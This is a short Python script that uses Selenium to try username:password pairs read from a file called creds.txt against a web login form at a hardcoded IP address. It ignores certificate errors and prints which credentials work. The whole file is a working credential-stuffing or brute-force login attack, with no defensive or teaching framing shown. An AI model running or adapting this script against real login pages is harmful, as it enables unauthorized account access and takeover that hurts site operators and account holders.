#!/usr/bin/python3
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

URL = "https://13.232.135.193:5001/"
SUCCESS_MSG = "Your login was successful!"


def get_credentials(cred_file):
    creds = []
    with open(cred_file) as fp:
        for line in fp:
            username, password = line.strip().split(":", 1)
            creds.append((username, password))
    return creds


def login(driver, credential):
    # Returns True if credential worked, else False.
    driver.get(URL)

    # Find username field
    username_input = driver.find_element("name", "username")
    # Find password field
    password_input = driver.find_element("name", "password")

    if not (username_input or password_input):
        print("Could not find either username or password field.")
        return False

    username, password = credential

    # Entering username
    username_input.send_keys(username)
    # Entering password
    password_input.send_keys(password)

    time.sleep(2)

    # Pressing Enter key
    password_input.send_keys(Keys.ENTER)

    # Sleeping for 2 seconds to let the page load
    time.sleep(2)

    # Now we check for success message in the page source.
    if SUCCESS_MSG in driver.page_source:
        # The login was successful.
        return True
    return False


def main():
    credentials = get_credentials("creds.txt")

    options = Options()
    options.add_argument("--ignore-certificate-errors")
    options.add_argument("--allow-running-insecure-content")
    driver = webdriver.Chrome(options=options)
    for cred in credentials:
        print(f"Trying credential: {cred}")
        success = login(driver=driver, credential=cred)
        if success:
            print(f"{cred} is valid.")
        else:
            print(f"{cred} is not valid.")
        print("-----" * 20)


if __name__ == "__main__":
    main()
